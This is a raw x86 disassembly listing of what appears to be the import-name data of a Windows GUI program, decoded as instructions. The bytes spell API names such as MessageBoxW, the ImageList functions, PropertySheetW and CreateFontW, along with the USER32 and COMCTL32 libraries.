  412e31:	imul   ebp,DWORD PTR [esi+0x64],0x6e55776f
  412e38:	imul   esp,DWORD PTR [ebx+0x6f],0xce006564
  412e3f:	add    DWORD PTR [ebp+0x65],ecx
  412e42:	jae    0x412eb7
  412e44:	popa   
  412e45:	addr16 gs inc edx
  412e48:	outs   dx,DWORD PTR ds:[esi]
  412e49:	js     0x412e8c
  412e4b:	add    BYTE PTR [ebp+0x61724400],dh
  412e51:	ja     0x412ea0
  412e53:	outs   dx,BYTE PTR gs:[esi]
  412e55:	jne    0x412e99
  412e57:	popa   
  412e58:	jb     0x412e5a
  412e5a:	inc    edx
  412e5b:	add    dl,BYTE PTR [ebx+0x65]
  412e5e:	je     0x412ea6
  412e60:	outs   dx,DWORD PTR ds:[esi]
  412e61:	jb     0x412ec8
  412e63:	addr16 jb 0x412ed5
  412e66:	jne    0x412ed6
  412e68:	fs push edi
  412e6a:	imul   ebp,DWORD PTR [esi+0x64],0xc200776f
  412e71:	add    dh,BYTE PTR [edi+0x76]
  412e74:	jae    0x412ee6
  412e76:	jb     0x412ee1
  412e78:	outs   dx,BYTE PTR ds:[esi]
  412e79:	je     0x412ee1
  412e7b:	push   edi
  412e7c:	add    BYTE PTR [eax],al
  412e7e:	mov    al,ds:0x57734901
  412e83:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412e8a:	push   ebp
  412e8b:	add    DWORD PTR [edi+0x65],eax
  412e8e:	je     0x412ee3
  412e90:	arpl   WORD PTR [edx+0x6f],si
  412e93:	ins    BYTE PTR es:[edi],dx
  412e94:	ins    BYTE PTR es:[edi],dx
  412e95:	push   eax
  412e96:	outs   dx,DWORD PTR ds:[esi]
  412e97:	jae    0x412e99
  412e99:	add    al,dh
  412e9b:	add    BYTE PTR [edi+0x65],al
  412e9e:	je     0x412ee1
  412ea0:	jae    0x412f1b
  412ea2:	outs   dx,BYTE PTR ds:[esi]
  412ea3:	arpl   WORD PTR [ebx+0x65],cx
  412ea6:	jns    0x412efb
  412ea8:	je     0x412f0b
  412eaa:	je     0x412f11
  412eac:	add    BYTE PTR [eax],al
  412eae:	or     eax,0x74654701
  412eb3:	inc    esp
  412eb4:	imul   esp,DWORD PTR [ecx+0x6c],0x6142676f
  412ebb:	jae    0x412f22
  412ebd:	push   ebp
  412ebe:	outs   dx,BYTE PTR ds:[esi]
  412ebf:	imul   esi,DWORD PTR [ebx+esi*2+0x0],0x5502a500
  412ec7:	jo     0x412f2d
  412ec9:	popa   
  412eca:	je     0x412f31
  412ecc:	push   edi
  412ecd:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412ed4:	or     eax,DWORD PTR [ecx]
  412ed6:	inc    edi
  412ed7:	gs je  0x412f1e
  412eda:	inc    ebx
  412edb:	inc    ebp
  412edc:	js     0x412ede
  412ede:	stos   DWORD PTR es:[edi],eax
  412edf:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  412ee3:	fs inc ebx
  412ee5:	jne    0x412f59
  412ee7:	jae    0x412f58
  412ee9:	jb     0x412f2c
  412eeb:	add    BYTE PTR [edx+eax*1+0x53],bl
  412eef:	gs je  0x412f45
  412ef2:	arpl   WORD PTR [edx+0x6f],si
  412ef5:	ins    BYTE PTR es:[edi],dx
  412ef6:	ins    BYTE PTR es:[edi],dx
  412ef7:	push   edx
  412ef8:	popa   
  412ef9:	outs   dx,BYTE PTR ds:[esi]
  412efa:	add    BYTE PTR gs:[bx+si],al
  412efe:	cmp    DWORD PTR [eax],eax
  412f00:	inc    ebx
  412f01:	push   0x70557261
  412f06:	jo     0x412f6d
  412f08:	jb     0x412f61
  412f0a:	add    BYTE PTR [eax],al
  412f0c:	fwait
  412f0d:	add    dl,BYTE PTR [ebp+0x6e]
  412f10:	ins    BYTE PTR es:[edi],dx
  412f11:	outs   dx,DWORD PTR ds:[esi]
  412f12:	popa   
  412f13:	fs dec ebx
  412f15:	gs jns 0x412f7a
  412f18:	outs   dx,DWORD PTR ds:[esi]
  412f19:	popa   
  412f1a:	jb     0x412f80
  412f1c:	dec    esp
  412f1d:	popa   
  412f1e:	jns    0x412f8f
  412f20:	jne    0x412f96
  412f22:	add    BYTE PTR [eax],al
  412f24:	push   esi
  412f25:	add    DWORD PTR [edi+0x65],eax
  412f28:	je     0x412f7d
  412f2a:	arpl   WORD PTR [edx+0x6f],si
  412f2d:	ins    BYTE PTR es:[edi],dx
  412f2e:	ins    BYTE PTR es:[edi],dx
  412f2f:	push   edx
  412f30:	popa   
  412f31:	outs   dx,BYTE PTR ds:[esi]
  412f32:	add    BYTE PTR gs:[bx+si],al
  412f36:	ins    DWORD PTR es:[edi],dx
  412f37:	add    DWORD PTR [edi+0x65],eax
  412f3a:	je     0x412f93
  412f3c:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  412f43:	outs   dx,BYTE PTR ds:[esi]
  412f44:	addr16 push edi
  412f46:	add    BYTE PTR [eax],al
  412f48:	add    BYTE PTR [ecx],0x49
  412f4b:	outs   dx,BYTE PTR ds:[esi]
  412f4c:	data16 ins BYTE PTR es:[edi],dx
  412f4e:	popa   
  412f4f:	je     0x412fb6
  412f51:	push   edx
  412f52:	arpl   WORD PTR gs:[eax+eax*1+0x16],si
  412f57:	add    dl,BYTE PTR [edx+0x65]
  412f5a:	ins    DWORD PTR es:[edi],dx
  412f5b:	outs   dx,DWORD PTR ds:[esi]
  412f5c:	jbe    0x412fc3
  412f5e:	dec    ebp
  412f5f:	outs   dx,BYTE PTR gs:[esi]
  412f61:	jne    0x412f63
  412f63:	add    BYTE PTR [ebx+0x61724400],ch
  412f69:	ja     0x412fac
  412f6b:	outs   dx,BYTE PTR ds:[esi]
  412f6c:	imul   ebp,DWORD PTR [ebp+0x61],0x52646574
  412f73:	arpl   WORD PTR gs:[ebx+esi*2+0x0],si
  412f78:	das    
  412f79:	add    dl,BYTE PTR [ebx+0x65]
  412f7c:	je     0x412fbf
  412f7e:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  412f82:	gs push edi
  412f84:	imul   ebp,DWORD PTR [esi+0x64],0x9c00776f
  412f8b:	add    BYTE PTR [ecx+ebp*2+0x61],al
  412f8f:	ins    BYTE PTR es:[edi],dx
  412f90:	outs   dx,DWORD PTR ds:[esi]
  412f91:	addr16 inc edx
  412f93:	outs   dx,DWORD PTR ds:[esi]
  412f94:	js     0x412fe6
  412f96:	popa   
  412f97:	jb     0x412ffa
  412f99:	ins    DWORD PTR es:[edi],dx
  412f9a:	inc    ecx
  412f9b:	add    bh,ah
  412f9d:	add    BYTE PTR [esi+0x72],al
  412fa0:	popa   
  412fa1:	ins    DWORD PTR es:[edi],dx
  412fa2:	gs push edx
  412fa4:	arpl   WORD PTR gs:[eax+eax*1-0x68],si
  412fa9:	add    DWORD PTR [ecx+0x73],ecx
  412fac:	inc    esp
  412fad:	imul   esp,DWORD PTR [ecx+0x6c],0x654d676f
  412fb4:	jae    0x413029
  412fb6:	popa   
  412fb7:	addr16 gs push edi
  412fba:	add    BYTE PTR [eax],al
  412fbc:	xor    DWORD PTR [eax],eax
  412fbe:	inc    ebx
  412fbf:	push   0x72507261
  412fc4:	gs jbe 0x41301e
  412fc7:	add    BYTE PTR ds:0x74654701,dl
  412fcd:	inc    esi
  412fce:	outs   dx,DWORD PTR ds:[esi]
  412fcf:	jb     0x413036
  412fd1:	addr16 jb 0x413043
  412fd4:	jne    0x413044
  412fd6:	fs push edi
  412fd8:	imul   ebp,DWORD PTR [esi+0x64],0xb700776f
  412fdf:	add    dl,BYTE PTR [edi+0x61]
  412fe2:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x706e4972
  412fea:	jne    0x413060
  412fec:	dec    ecx
  412fed:	fs ins BYTE PTR es:[edi],dx
  412fef:	add    BYTE PTR gs:[eax],al
  412ff2:	push   edi
  412ff3:	add    dl,BYTE PTR [ebx+0x65]
  412ff6:	je     0x413048
  412ff8:	jb     0x413069
  412ffa:	jo     0x413053
  412ffc:	add    BYTE PTR [eax],al
  412ffe:	dec    eax
  412fff:	add    dl,BYTE PTR [ebx+0x65]
  413002:	je     0x413051
  413004:	outs   dx,BYTE PTR gs:[esi]
  413006:	jne    0x413008
  413008:	scas   al,BYTE PTR es:[edi]
  413009:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  41300d:	fs inc ebx
  41300f:	jne    0x413083
  413011:	jae    0x413082
  413013:	jb     0x41306c
  413015:	add    BYTE PTR [edi+0x2],bl
  413018:	push   ebx
  413019:	gs je  0x41306f
  41301c:	jns    0x413091
  41301e:	inc    ebx
  41301f:	outs   dx,DWORD PTR ds:[esi]
  413020:	ins    BYTE PTR es:[edi],dx
  413021:	outs   dx,DWORD PTR ds:[esi]
  413022:	jb     0x413097
  413024:	add    BYTE PTR [eax],al
  413026:	xchg   esp,eax
  413027:	add    dl,BYTE PTR [edx+esi*2+0x61]
  41302b:	outs   dx,BYTE PTR ds:[esi]
  41302c:	jae    0x41309a
  41302e:	popa   
  41302f:	je     0x413096
  413031:	inc    ecx
  413032:	arpl   WORD PTR [ebx+0x65],sp
  413035:	ins    BYTE PTR es:[edi],dx
  413036:	gs jb  0x41309a
  413039:	je     0x4130aa
  41303b:	jb     0x413094
  41303d:	add    BYTE PTR [edi+0x66654400],cl
  413043:	push   edi
  413044:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  41304b:	outs   dx,DWORD PTR ds:[esi]
  41304c:	arpl   WORD PTR [edi+0x0],dx
  41304f:	add    BYTE PTR [ecx+0x0],ah
  413052:	inc    ebx
  413053:	jb     0x4130ba
  413055:	popa   
  413056:	je     0x4130bd
  413058:	push   eax
  413059:	outs   dx,DWORD PTR ds:[esi]
  41305a:	jo     0x4130d1
  41305c:	jo     0x4130ab
  41305e:	outs   dx,BYTE PTR gs:[esi]
  413060:	jne    0x413062
  413062:	push   ecx
  413063:	add    dl,BYTE PTR [ebx+0x65]
  413066:	je     0x4130b8
  413068:	popa   
  413069:	jb     0x4130d0
  41306b:	outs   dx,BYTE PTR ds:[esi]
  41306c:	je     0x41306e
  41306e:	popf   
  41306f:	add    BYTE PTR [ecx+ebp*2+0x61],al
  413073:	ins    BYTE PTR es:[edi],dx
  413074:	outs   dx,DWORD PTR ds:[esi]
  413075:	addr16 inc edx
  413077:	outs   dx,DWORD PTR ds:[esi]
  413078:	js     0x4130ca
  41307a:	popa   
  41307b:	jb     0x4130de
  41307d:	ins    DWORD PTR es:[edi],dx
  41307e:	push   edi
  41307f:	add    BYTE PTR [edx+0x6c695402],cl
  413085:	gs push edi
  413087:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  41308e:	sub    DWORD PTR [eax],eax
  413090:	inc    ebx
  413091:	push   0x6f4c7261
  413096:	ja     0x4130fd
  413098:	jb     0x4130f1
  41309a:	add    BYTE PTR [eax],al
  41309c:	out    dx,eax
  41309d:	add    DWORD PTR [eax+0x65],edx
  4130a0:	imul   ecx,DWORD PTR gs:[ebp+0x65],0x73
  4130a5:	jae    0x413108
  4130a7:	addr16 gs push edi
  4130aa:	add    BYTE PTR [eax],al
  4130ac:	jne    0x4130af
  4130ae:	inc    edi
  4130af:	gs je  0x413109
  4130b2:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  4130b9:	js     0x41312f
  4130bb:	inc    ecx
  4130bc:	add    BYTE PTR [eax],al
  4130be:	add    DWORD PTR ds:[edi+0x65],eax
  4130c2:	je     0x413111
  4130c4:	gs jae 0x41313a
  4130c7:	popa   
  4130c8:	addr16 gs push edi
  4130cb:	add    BYTE PTR ds:0x61684300,ch
  4130d1:	jb     0x413121
  4130d3:	gs js  0x41314a
  4130d6:	push   edi
  4130d7:	add    BYTE PTR [ecx+eax*1+0x64616f4c],bh
  4130de:	push   ebx
  4130df:	je     0x413153
  4130e1:	imul   ebp,DWORD PTR [esi+0x67],0x2800057
  4130e8:	push   ebx
  4130e9:	push   0x6957776f
  4130ee:	outs   dx,BYTE PTR ds:[esi]
  4130ef:	outs   dx,DWORD PTR fs:[esi]
  4130f1:	ja     0x413134
  4130f3:	jae    0x41316e
  4130f5:	outs   dx,BYTE PTR ds:[esi]
  4130f6:	arpl   WORD PTR [eax],ax
  4130f8:	add    BYTE PTR ss:[ebx+0x68],al
  4130fc:	popa   
  4130fd:	jb     0x413154
  4130ff:	jo     0x413171
  413101:	gs jb  0x413145
  413104:	add    BYTE PTR [eax],al
  413106:	sti    
  413107:	add    DWORD PTR [eax+0x74],edx
  41310a:	dec    ecx
  41310b:	outs   dx,BYTE PTR ds:[esi]
  41310c:	push   edx
  41310d:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  413112:	sbb    eax,DWORD PTR [eax]
  413114:	inc    ebx
  413115:	popa   
  413116:	ins    BYTE PTR es:[edi],dx
  413117:	ins    BYTE PTR es:[edi],dx
  413118:	push   edi
  413119:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  413120:	outs   dx,DWORD PTR ds:[esi]
  413121:	arpl   WORD PTR [edi+0x0],dx
  413124:	lahf   
  413125:	add    BYTE PTR [ecx+ebp*2+0x73],al
  413129:	jo     0x41318c
  41312b:	je     0x413190
  41312d:	push   0x7373654d
  413132:	popa   
  413133:	addr16 gs inc ecx
  413136:	add    BYTE PTR [eax],al
  413138:	mov    BYTE PTR [edx],al
  41313a:	push   esp
  41313b:	popa   
  41313c:	bound  esp,QWORD PTR [edx+0x65]
  41313f:	fs push esp
  413141:	gs js  0x4131b8
  413144:	dec    edi
  413145:	jne    0x4131bb
  413147:	push   edi
  413148:	add    BYTE PTR [eax],al
  41314a:	sub    eax,DWORD PTR [edx]
  41314c:	push   ebx
  41314d:	outs   dx,BYTE PTR gs:[esi]
  41314f:	fs dec ebp
  413151:	gs jae 0x4131c7
  413154:	popa   
  413155:	addr16 gs push edi
  413158:	add    BYTE PTR [eax],al
  41315a:	add    DWORD PTR fs:[edi+0x65],eax
  41315e:	je     0x4131b5
  413160:	jo     0x4131c6
  413162:	popa   
  413163:	je     0x4131ca
  413165:	push   edx
  413166:	outs   dx,BYTE PTR ds:[si]
  413168:	add    BYTE PTR [eax],al
  41316a:	mov    eax,0x61724400
  41316f:	ja     0x4131c4
  413171:	je     0x4131d4
  413173:	je     0x4131da
  413175:	push   edi
  413176:	add    BYTE PTR [eax],al
  413178:	sub    eax,0x74654701
  41317d:	dec    ebp
  41317e:	outs   dx,BYTE PTR gs:[esi]
  413180:	jne    0x4131c5
  413182:	push   0x4d6b6365
  413187:	popa   
  413188:	jb     0x4131f5
  41318a:	inc    esp
  41318b:	imul   ebp,DWORD PTR [ebp+0x65],0x6f69736e
  413192:	outs   dx,BYTE PTR ds:[esi]
  413193:	jae    0x413195
  413195:	add    BYTE PTR [ebx+0x616f4c01],bh
  41319b:	fs push ebx
  41319d:	je     0x413211
  41319f:	imul   ebp,DWORD PTR [esi+0x67],0x2590041
  4131a6:	push   ebx
  4131a7:	gs je  0x4131fc
  4131aa:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  4131af:	jo     0x413225
  4131b1:	jns    0x4131b3
  4131b3:	add    BYTE PTR [edi+0x0],dl
  4131b6:	inc    ebx
  4131b7:	jb     0x41321e
  4131b9:	popa   
  4131ba:	je     0x413221
  4131bc:	inc    esp
  4131bd:	imul   esp,DWORD PTR [ecx+0x6c],0x6e49676f
  4131c4:	imul   esi,DWORD PTR fs:[edx+0x65],0x61507463
  4131cc:	jb     0x41322f
  4131ce:	ins    DWORD PTR es:[edi],dx
  4131cf:	push   edi
  4131d0:	add    BYTE PTR [eax],al
  4131d2:	cmp    BYTE PTR [eax],al
  4131d4:	inc    ebx
  4131d5:	push   0x70557261
  4131da:	jo     0x413241
  4131dc:	jb     0x413220
  4131de:	jne    0x413246
  4131e0:	push   di
  4131e2:	add    BYTE PTR [eax],al
  4131e4:	ja     0x4131e7
  4131e6:	inc    edi
  4131e7:	gs je  0x413241
  4131ea:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  4131f1:	js     0x413267
  4131f3:	dec    esp
  4131f4:	outs   dx,BYTE PTR gs:[esi]
  4131f6:	addr16 je 0x413261
  4131f9:	push   edi
  4131fa:	add    BYTE PTR [eax],al
  4131fc:	xor    eax,0x61684300
  413201:	jb     0x413257
  413203:	outs   dx,DWORD PTR ds:[esi]
  413204:	dec    edi
  413205:	gs ins DWORD PTR es:[edi],dx
  413207:	push   edi
  413208:	add    BYTE PTR [eax],al
  41320a:	dec    edx
  41320b:	add    dl,BYTE PTR [ebx+0x65]
  41320e:	je     0x41325d
  413210:	outs   dx,BYTE PTR gs:[esi]
  413212:	jne    0x413258
  413214:	gs popaw 
  413217:	jne    0x413285
  413219:	je     0x413264
  41321b:	je     0x413282
  41321d:	ins    DWORD PTR es:[edi],dx
  41321e:	add    BYTE PTR [eax],al
  413220:	push   ebp
  413221:	push   ebx
  413222:	inc    ebp
  413223:	push   edx
  413224:	xor    esi,DWORD PTR [edx]
  413226:	cs fs ins BYTE PTR es:[edi],dx
  413229:	ins    BYTE PTR es:[edi],dx
  41322a:	add    BYTE PTR [eax],al
  41322c:	push   ebx
  41322d:	add    BYTE PTR [ecx+0x6d],cl
  413230:	popa   
  413231:	addr16 gs dec esp
  413234:	imul   esi,DWORD PTR [ebx+0x74],0x7465535f
  41323b:	dec    ecx
  41323c:	arpl   WORD PTR [edi+0x6e],bp
  41323f:	push   ebx
  413240:	imul   edi,DWORD PTR [edx+0x65],0x49005600
  413247:	ins    DWORD PTR es:[edi],dx
  413248:	popa   
  413249:	addr16 gs dec esp
  41324c:	imul   esi,DWORD PTR [ebx+0x74],0x6972575f
  413253:	je     0x4132ba
  413255:	add    BYTE PTR [esi+0x0],cl
  413258:	dec    ecx
  413259:	ins    DWORD PTR es:[edi],dx
  41325a:	popa   
  41325b:	addr16 gs dec esp
  41325e:	imul   esi,DWORD PTR [ebx+0x74],0x7065525f
  413265:	ins    BYTE PTR es:[edi],dx
  413266:	popa   
  413267:	arpl   WORD PTR [ebp+0x49],sp
  41326a:	arpl   WORD PTR [edi+0x6e],bp
  41326d:	add    BYTE PTR [esi],dh
  41326f:	add    BYTE PTR [ecx+0x6d],cl
  413272:	popa   
  413273:	addr16 gs dec esp
  413276:	imul   esi,DWORD PTR [ebx+0x74],0x6172445f
  41327d:	ja     0x41327f
  41327f:	add    BYTE PTR [ebx],dl
  413281:	add    BYTE PTR [ebx+0x72],al
  413284:	gs popa 
  413286:	je     0x4132ed
  413288:	push   eax
  413289:	jb     0x4132fa
  41328b:	jo     0x4132f2
  41328d:	jb     0x413303
  41328f:	jns    0x4132e4
  413291:	push   0x50746565
  413296:	popa   
  413297:	addr16 gs push edi
  41329a:	add    BYTE PTR [eax],al
  41329c:	pop    esp
  41329d:	add    BYTE PTR [eax+0x72],dl
  4132a0:	outs   dx,DWORD PTR ds:[esi]
  4132a1:	jo     0x413308
  4132a3:	jb     0x413319
  4132a5:	jns    0x4132fa
  4132a7:	push   0x57746565
  4132ac:	add    BYTE PTR [eax],al
  4132ae:	inc    ebx
  4132af:	dec    edi
  4132b0:	dec    ebp
  4132b1:	inc    ebx
  4132b2:	push   esp
  4132b3:	dec    esp
  4132b4:	xor    esi,DWORD PTR [edx]
  4132b6:	cs fs ins BYTE PTR es:[edi],dx
  4132b9:	ins    BYTE PTR es:[edi],dx
  4132ba:	add    BYTE PTR [eax],al
  4132bc:	mov    WORD PTR [eax],es
  4132be:	inc    ebx
  4132bf:	jb     0x413326
  4132c1:	popa   
  4132c2:	je     0x413329
  4132c4:	inc    ebx
  4132c5:	outs   dx,DWORD PTR ds:[esi]
  4132c6:	ins    DWORD PTR es:[edi],dx
  4132c7:	jo     0x41332a
  4132c9:	je     0x413334
  4132cb:	bound  ebp,QWORD PTR [ebp+eiz*2+0x42]
  4132cf:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xa5000070
  4132d7:	add    BYTE PTR [ebx+0x72],al
  4132da:	gs popa 
  4132dc:	je     0x413343
  4132de:	push   eax
  4132df:	popa   
  4132e0:	ins    BYTE PTR es:[edi],dx
  4132e1:	gs je  0x413358
  4132e4:	add    BYTE PTR gs:[ebx+0x746e4901],dl
  4132eb:	gs jb  0x413361
  4132ee:	arpl   WORD PTR gs:[ebx+eax*2+0x6c],si
  4132f3:	imul   esi,DWORD PTR [eax+0x52],0x746365
  4132fa:	into   
  4132fb:	add    DWORD PTR [ebx+0x65],edx
  4132fe:	ins    BYTE PTR es:[edi],dx
  4132ff:	arpl   WORD PTR gs:[edi+ecx*2+0x62],si
  413304:	push   0x65
  413306:	arpl   WORD PTR [eax+eax*1+0x0],si
  41330a:	jp     0x41330d
  41330c:	inc    edi
  41330d:	gs je  0x413363
  413310:	jns    0x413385
  413312:	je     0x413379
  413314:	ins    DWORD PTR es:[edi],dx
  413315:	push   eax
  413316:	popa   
  413317:	ins    BYTE PTR es:[edi],dx
  413318:	gs je  0x41338f
  41331b:	gs push ebp
  41331d:	jae    0x413384
  41331f:	add    BYTE PTR [ecx+0x65724300],cl
  413325:	popa   
  413326:	je     0x41338d
  413328:	inc    edx
  413329:	jb     0x4133a0
  41332b:	jae    0x413395
  41332d:	dec    ecx
  41332e:	outs   dx,BYTE PTR ds:[esi]
  41332f:	imul   esi,DWORD PTR fs:[edx+0x65],0xe8007463
  413337:	add    DWORD PTR [ebx+0x65],edx
  41333a:	je     0x413389
  41333c:	popa   
  41333d:	jo     0x41338c
  41333f:	outs   dx,DWORD PTR ds:[esi]
  413340:	fs add BYTE PTR gs:[eax],al
  413344:	pop    esp
  413345:	add    DWORD PTR [edi+0x65],eax
  413348:	je     0x413396
  41334a:	popa   
  41334b:	jns    0x4133bc
  41334d:	jne    0x4133c3
  41334f:	add    bh,ch
  413351:	add    DWORD PTR [ebx+0x65],edx
  413354:	je     0x4133a6
  413356:	imul   edi,DWORD PTR [eax+0x65],0xc700006c
  41335d:	add    DWORD PTR [ebx+0x61],edx
  413360:	jbe    0x4133c7
  413362:	inc    esp
  413363:	inc    ebx
  413364:	add    BYTE PTR [eax],al
  413366:	pop    edi
  413367:	add    DWORD PTR [edi+0x65],eax
  41336a:	je     0x4133b9
  41336c:	popa   
  41336d:	jo     0x4133bc
  41336f:	outs   dx,DWORD PTR ds:[esi]
  413370:	fs add BYTE PTR gs:[eax],al
  413374:	mov    ds:0x65724300,al
  413379:	popa   
  41337a:	je     0x4133e1
  41337c:	dec    ecx
  41337d:	inc    ebx
  41337e:	push   edi
  41337f:	add    BYTE PTR [esi+0x65724300],dl
  413385:	popa   
  413386:	je     0x4133ed
  413388:	inc    ebp
  413389:	ins    BYTE PTR es:[edi],dx
  41338a:	ins    BYTE PTR es:[edi],dx
  41338b:	imul   esi,DWORD PTR [eax+0x74],0x67526369
  413392:	outs   dx,BYTE PTR ds:[esi]
  413393:	dec    ecx
  413394:	outs   dx,BYTE PTR ds:[esi]
  413395:	imul   esi,DWORD PTR fs:[edx+0x65],0x99007463
  41339d:	add    BYTE PTR [ebx+0x72],al
  4133a0:	gs popa 
  4133a2:	je     0x413409
  4133a4:	inc    esi
  4133a5:	outs   dx,DWORD PTR ds:[esi]
  4133a6:	outs   dx,BYTE PTR ds:[esi]
  4133a7:	je     0x4133ea
  4133a9:	add    BYTE PTR ds:0x61725402,cl
  4133af:	outs   dx,BYTE PTR ds:[esi]
  4133b0:	jae    0x41341e
  4133b2:	popa   
  4133b3:	je     0x41341a
  4133b5:	inc    ebx
  4133b6:	push   0x65737261
  4133bb:	je     0x413406
  4133bd:	outs   dx,BYTE PTR ds:[esi]
  4133be:	outs   dx,WORD PTR ds:[esi]
  4133c0:	add    BYTE PTR [eax],al
  4133c2:	out    dx,al
  4133c3:	add    DWORD PTR [ebx+0x65],edx
  4133c6:	je     0x413418
  4133c8:	popa   
  4133c9:	ins    BYTE PTR es:[edi],dx
  4133ca:	gs je  0x413441
  4133cd:	gs inc ebp
  4133cf:	outs   dx,BYTE PTR ds:[esi]
  4133d0:	je     0x413444
  4133d2:	imul   esp,DWORD PTR [ebp+0x73],0x5301d300
  4133d9:	gs je  0x41341e
  4133dc:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x6d694470
  4133e4:	outs   dx,BYTE PTR gs:[esi]
  4133e6:	jae    0x413451
  4133e8:	outs   dx,DWORD PTR ds:[esi]
  4133e9:	outs   dx,BYTE PTR ds:[esi]
  4133ea:	inc    ebp
  4133eb:	js     0x4133ed
  4133ed:	add    BYTE PTR [esi],al
  4133ef:	add    dl,BYTE PTR [ebx+0x74]
  4133f2:	jb     0x413459
  4133f4:	je     0x413459
  4133f6:	push   0x746c42
  4133fb:	add    BYTE PTR [eax+eax*1+0x61657243],dl
  413402:	je     0x413469
  413404:	inc    esp
  413405:	imul   esi,DWORD PTR [ebx+0x63],0x61647261
  41340c:	bound  ebp,QWORD PTR [ebp+eiz*2+0x42]
  413410:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x13f0070
  413418:	inc    edi
  413419:	gs je  0x413460
  41341c:	dec    ecx
  41341d:	inc    edx
  41341e:	inc    ebx
  41341f:	outs   dx,DWORD PTR ds:[esi]
  413420:	ins    BYTE PTR es:[edi],dx
  413421:	outs   dx,DWORD PTR ds:[esi]
  413422:	jb     0x413478
  413424:	popa   
  413425:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  413429:	add    BYTE PTR [edi+0x6e694c01],dl
  41342f:	gs push esp
  413431:	outs   dx,DWORD PTR ds:[esi]
  413432:	add    BYTE PTR [eax],al
  413434:	clc    
  413435:	add    DWORD PTR [ebx+0x65],edx
  413438:	je     0x41348e
  41343a:	gs js  0x4134b1
  41343d:	inc    ecx
  41343e:	ins    BYTE PTR es:[edi],dx
  41343f:	imul   esp,DWORD PTR [edi+0x6e],0x1a40000
  413446:	push   eax
  413447:	popa   
  413448:	je     0x41348c
  41344a:	ins    BYTE PTR es:[edi],dx
  41344b:	je     0x41344d
  41344d:	add    BYTE PTR [ebp+0x0],dh
  413450:	inc    edx
  413451:	imul   ebp,DWORD PTR gs:[bp+0x50],0x687461
  41345a:	test   al,0x0
  41345c:	inc    ebx
  41345d:	jb     0x4134c4
  41345f:	popa   
  413460:	je     0x4134c7
  413462:	push   eax
  413463:	outs   dx,BYTE PTR gs:[esi]
  413465:	dec    ecx
  413466:	outs   dx,BYTE PTR ds:[esi]
  413467:	imul   esi,DWORD PTR fs:[edx+0x65],0x83007463
  41346f:	add    DWORD PTR [edi+0x65],eax
  413472:	je     0x4134c8
  413474:	gs js  0x4134eb
  413477:	inc    ebp
  413478:	js     0x4134ee
  41347a:	outs   dx,BYTE PTR gs:[esi]
  41347c:	je     0x4134ce
  41347e:	outs   dx,DWORD PTR ds:[esi]
  41347f:	imul   ebp,DWORD PTR [esi+0x74],0x413233
  413486:	aam    0x1
  413488:	push   ebx
  413489:	gs je  0x4134ce
  41348c:	imul   eax,DWORD PTR [ebx+0x6f],0x6c
  413490:	outs   dx,DWORD PTR ds:[esi]
  413491:	jb     0x413493
  413493:	add    bl,dh
  413495:	add    DWORD PTR [ebx+0x65],edx
  413498:	je     0x4134ec
  41349a:	dec    edi
  41349b:	push   eax
  41349c:	xor    al,BYTE PTR [eax]
  41349e:	stos   BYTE PTR es:[edi],al
  41349f:	add    BYTE PTR [ebx+0x72],al
  4134a2:	gs popa 
  4134a4:	je     0x41350b
  4134a6:	push   eax
  4134a7:	outs   dx,DWORD PTR ds:[esi]
  4134a8:	ins    BYTE PTR es:[edi],dx
  4134a9:	jns    0x413512
  4134ab:	outs   dx,DWORD PTR ds:[esi]
  4134ac:	outs   dx,BYTE PTR ds:[esi]
  4134ad:	push   edx
  4134ae:	outs   dx,BYTE PTR ds:[si]
  4134b0:	add    BYTE PTR [eax],al
  4134b2:	xchg   DWORD PTR [ecx],eax
  4134b4:	inc    edi
  4134b5:	gs je  0x41350c
  4134b8:	gs js  0x41352f
  4134bb:	inc    ebp
  4134bc:	js     0x413532
  4134be:	outs   dx,BYTE PTR gs:[esi]
  4134c0:	je     0x413512
  4134c2:	outs   dx,DWORD PTR ds:[esi]
  4134c3:	imul   ebp,DWORD PTR [esi+0x74],0x2010057
  4134ca:	push   ebx
  4134cb:	gs je  0x413525
  4134ce:	imul   ebp,DWORD PTR [esi+0x64],0x724f776f
  4134d5:	addr16 inc ebp
  4134d7:	js     0x4134d9
  4134d9:	add    BYTE PTR [edi+0x65724300],ah
  4134df:	popa   
  4134e0:	je     0x413547
  4134e2:	push   eax
  4134e3:	outs   dx,BYTE PTR gs:[esi]
  4134e5:	add    BYTE PTR [esi+0x74654701],cl
  4134eb:	push   esi
  4134ec:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  4134f3:	dec    edi
  4134f4:	jb     0x41355d
  4134f6:	inc    ebp
  4134f7:	js     0x4134f9
  4134f9:	add    ch,cl
  4134fb:	add    BYTE PTR [ebp+0x73],al
  4134fe:	arpl   WORD PTR [ecx+0x70],sp
  413501:	add    BYTE PTR gs:[eax],al
  413504:	mov    bl,0x1
  413506:	push   eax
  413507:	outs   dx,DWORD PTR ds:[esi]
  413508:	ins    BYTE PTR es:[edi],dx
  413509:	jns    0x413572
  41350b:	outs   dx,DWORD PTR ds:[esi]
  41350c:	outs   dx,BYTE PTR ds:[esi]
  41350d:	add    BYTE PTR [ebx+0x65724300],ch
  413513:	popa   
  413514:	je     0x41357b
  413516:	push   edx
  413517:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  41351c:	outs   dx,BYTE PTR ds:[esi]
  41351d:	add    BYTE PTR [ecx+eax*1+0x54746547],al
  413524:	gs js  0x41359b
  413527:	inc    ebp
  413528:	js     0x41359e
  41352a:	outs   dx,BYTE PTR gs:[esi]
  41352c:	je     0x41357e
